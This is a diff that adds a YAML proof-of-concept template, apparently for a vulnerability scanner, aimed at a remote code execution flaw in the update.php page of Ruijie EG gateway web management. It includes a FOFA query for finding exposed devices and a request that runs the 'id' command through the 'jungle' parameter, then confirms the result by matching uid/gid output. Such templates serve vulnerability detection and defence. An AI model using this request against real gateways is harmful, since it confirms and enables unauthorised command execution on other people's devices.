@@ -1,0 +1,27 @@
+id: poc-yaml-ruijie-rg-eg-web-mis-rce
+info:
+  name: 锐捷EG易网关WEB管理系统 update.php远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: RG-UAC
+  fofa: body="请输入您的RG-EG易网关的用户名和密码"
+requests:
+- method: GET
+  path: /
+  expression: 'status_code == 200 &&
+
+    contains(body,"ruijie")
+
+    '
+- method: GET
+  path: /update.php?jungle=id
+  expression: 'status_code == 200 &&
+
+    matches(body,`uid=\d+\(\w+\)\s+gid=\d+\(\w+\)`) && !contains(body, "<") &&
+
+    contains(headers,"text/html")
+
+    '
+variables: {}
+transport: http
